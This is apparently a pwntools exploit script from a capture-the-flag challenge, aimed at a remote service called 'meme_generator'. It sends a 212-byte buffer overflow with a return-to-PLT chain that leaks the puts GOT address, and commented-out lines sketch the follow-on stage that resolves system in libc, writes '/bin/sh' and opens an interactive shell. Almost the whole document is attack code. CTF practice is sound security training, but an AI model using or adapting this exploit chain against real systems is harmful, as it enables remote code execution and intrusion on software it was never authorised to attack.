from pwn import *

p = remote('noob.bckdr.in',13371)
# p = process('meme_generator')
elf =ELF('meme_generator')
context.log_level = "debug"
offset = 212

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = p32(elf.symbols['main'])

# def leak(address):
payload  = ""
payload += "A"*offset
payload += p32(puts_plt)
payload += main
payload += p32(puts_got)
p.sendline('2')
out = p.sendline(payload)
data = p.recv(4)
print (data,len(data))
# return data


# print(leak())

# l = DynELF(leak,elf=ELF('meme_generator'))


# system_addr = l.lookup('system','libc')
# log.success('leak system address: ' + hex(system_addr))

# libc_base = read_libc - read_offset_libc

# log.info("Libc base : " + hex(libc_base))

# system_libc = libc_base + system_offset_libc

# log.info("system addr: " + hex(system_libc))

# binsh_addr = libc_base + binsh_offset_libc

# log.info("Read  @libc: " + hex(read_libc))

# payload = "A"*offset
# payload += read_plt
# payload += p32(pppr)
# payload += p32(0)
# payload += p32(bss)
# payload += p32(8)
# payload += p32(system_addr)
# payload += main
# payload += p32(bss)

# p.sendline(payload)
# p.sendline("/bin/sh\x00")
p.interactive()
